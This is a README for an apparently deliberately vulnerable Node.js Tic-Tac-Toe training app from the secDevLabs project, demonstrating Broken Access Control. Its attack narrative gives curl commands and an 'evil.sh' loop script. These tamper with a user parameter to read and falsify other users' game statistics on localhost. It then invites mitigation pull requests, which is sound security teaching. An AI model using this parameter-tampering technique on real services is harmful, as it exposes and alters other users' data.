
# Tic-Tac-Toe

<p align="center"><img  src="images/a5-banner.png"/></p>

Tic-Tac-Toe is a simple Nodejs web application that contains an example of a Broken Access Control vulnerability and its main goal is to describe how a malicious user could exploit it.

## Index

- [Definition](#what-is-broken-access-control)
- [Setup](#setup)
- [Attack narrative](#attack-narrative)
- [Objectives](#secure-this-app)
- [Solutions](#pr-solutions)
- [Contributing](#contributing)

## What is Broken Access Control?

Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access to other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.

The main goal of this app is to discuss how **Broken Access Control** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup

To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh

cd secDevLabs/owasp-top10-2017-apps/a5/tictactoe

```

```sh

make install

```

Then simply visit [http://localhost.:10005][App] ! 😆

## Get to know the app 🕹

To properly understand how this application works, you can follow this step:

- Try registering a user
- Sign in
- Play the game 
- See your statistics

## Attack narrative

Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜

#### Lack of user cookie validation allows for an attacker to get other users' game statistics

### 👀

In order to better understand how the application handles its data, two users, `user1` and `user2`, can be created using the web interface by visiting [http://locahost:.10005/create](http://localhost:.10005/create) as exemplified below:

<p  align="center"><img  src="images/attack0.png"/></p>

After logging in as `user1` and playing a few times, his/her statistics can be checked by visiting [http://localhost.:10005/statistics](localhost.:10005/statistics), as the following picture shows:

<p  align="center"><img  src="images/attack1.png"/></p>

To check how this information in being retrieved form the server, an attacker could use Developer Tools from Firefox using `Ctrl + Shift + E` or `Command + Option + E` on a Mac, as showed bellow:

<p  align="center"><img  src="images/attack3.png"/></p>

You can replicate this GET by using the following curl command (use your own `tictacsession` token):  

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user1'
```

```json
{"chartData":[{"y":46.15384615384615,"label":"Wins"},{"y":15.384615384615385,"label":"Ties"},{"y":38.46153846153846,"label":"Loses"}],"numbers":{"games":13,"wins":6,"ties":2,"loses":5}}
```

### 🔥

As this AJAX request is being made passing the username as a URL parameter, it may indicate that only this parameter is being used to verify the permission to get the data. To check this, using the same `tictacsession`, an attacker could replace `user1` to another known user, as `user2` for example: 

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user2'
```

```json
{"chartData":[{"y":100,"label":"Wins"},{"y":0,"label":"Ties"},{"y":0,"label":"Loses"}],"numbers":{"games":1,"wins":1,"ties":0,"loses":0}}
```

This fact represents a `Broken Access Control` vulnerability, allowing an attacker to see every known user's private statistics.

#### Lack of user cookie validation allows for an attacker to manipulate user statistics

### 👀

Using the same methodology, an attacker could now check what the application does when a game finishes to store this result. Analyzing the browser inspector once again reveals that a POST is made to the `/game` route, as can be seen in the next image: 

<p  align="center"><img  src="images/attack4.png"/></p>

This request is done by using to parameters, `user` and `result`, as shown bellow: 

<p  align="center"><img  src="images/attack5.png"/></p>

To replicate this POST by using the curl command (use your own `tictacsession` token), you can type the following command: 

```sh
curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user1&result=win'
```

```json
OK
```

### 🔥

An attacker now could check if, by using another username into this request, he/she could modify others' user statistcs. To do so, the parameter `user` is change into another known user, as `user2` for example:

```sh
curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user2&result=win'
```

```json
OK
```
  
Imagining a worst scenario, an attacker could create a malicious script to send this same request as many times as he/she could, as can be exempliflied bellow:

```sh
vi evil.sh
```

```sh
#!/bin/sh
#
# evil.sh - Add 100 loses to an user! 

user="user2"
num=100
result="lose"
tictacsession="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM"

for i in `seq 1 $num`; do
    curl -s 'POST' -b "tictacsession=$tictacsession" 'http://localhost.:10005/game' --data-binary "user=$user&result=$result"
done
```

And run it: 

```sh
chmod +x evil.sh && ./evil.sh
```

```sh
OKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOK
```

To check if this attack indeed worked, the malicious user could exploit the previous vulnerability to check `user2` statistics using the following command:

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/statistics/data?user=user2'
```

```json
{"chartData":[{"y":3.6363636363636362,"label":"Wins"},{"y":2.727272727272727,"label":"Ties"},{"y":93.63636363636364,"label":"Loses"}],"numbers":{"games":110,"wins":4,"ties":3,"loses":103}}
```

Once again, this fact represents a `Broken Access Control` vulnerability, allowing an attacker to modify every known user's private statistics.

## Secure this app

How would you mitigate this vulnerability? After your changes, an attacker should not be able to:

- Access other users' private statistics.
- Modify other users' private statistics.

## PR solutions

[Spoiler alert 🚨 ] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?utf8=%E2%9C%93&q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Tic-Tac-Toe%22+)!

## Contributing

We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉

[Docker Install]: https://docs.docker.com/install/
[Docker Compose Install]: https://docs.docker.com/compose/install/
[App]: http://localhost.:10005
[secDevLabs]: https://github.com/globocom/secDevLabs
[2]:https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a5/tictactoe